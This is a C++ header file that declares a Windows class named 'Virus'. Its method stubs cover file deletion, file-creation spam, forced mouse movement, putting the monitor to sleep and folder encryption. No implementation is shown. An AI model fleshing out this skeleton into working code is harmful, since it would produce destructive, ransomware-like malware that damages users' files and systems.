#pragma once

#include<Windows.h>
#include<filesystem>
#include<iostream>
#include<fstream>
#include<direct.h>
#include<string>

class Virus
{
public:
	Virus();
	
	void menu();
	void music();
	void choice();
	void delete_file();
	void monitor_sleep();
	void file_creation_spam();
	void moveMouse(int x, int y, int count);
	void encrypt_folder(std::string path);

private:
	int screen_height{};
	int screen_width{};

	std::string path;

	char encrypt(char data, char password);
	bool FileExists(std::string fname);
};
